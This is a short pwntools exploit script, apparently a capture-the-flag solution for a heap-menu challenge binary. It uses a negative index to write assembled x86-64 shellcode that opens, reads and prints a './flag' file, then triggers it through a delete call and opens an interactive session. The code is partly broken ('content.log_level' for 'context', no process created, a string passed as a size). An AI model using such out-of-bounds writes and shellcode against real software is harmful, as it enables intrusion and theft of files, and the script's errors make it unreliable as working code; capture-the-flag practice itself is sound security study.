from pwn import*
import pwn
content.log_level='debug'

def add(id,size,content):
	p.recvuntil('choice >>\n')
	p.sendline('1')
	p.recvuntil('ndex:\n')
	p.sendline(str(id))
	p.recvuntil('size:\n')
	p.sendline(str(size))
	p.recvuntil('content:\n')
	p.send(str(content))

def delete(id):
	p.recvuntil('choice >>\n')
	p.sendline('4')
	p.recvuntil('ndex:\n')
	p.sendline(str(id))

shellcode='''
mov r8, rdi
xor rsi,rsi
mov rdi ,r8
mov rax, 2
syscall
mov rdi, rax
mov rsi, r8
mov rdx, 0x30
mov rax, 0
syscall
mov rdi, 1
mov rsi,r8
mov rdx, 0x30
mov rax, 1
syscall
'''
payload=pwn.asm(shellcode)
add(0,8,'./flag\x00'+'\n')
add(-25,'a',payload+'\n')


delete(0)
p.interactive()












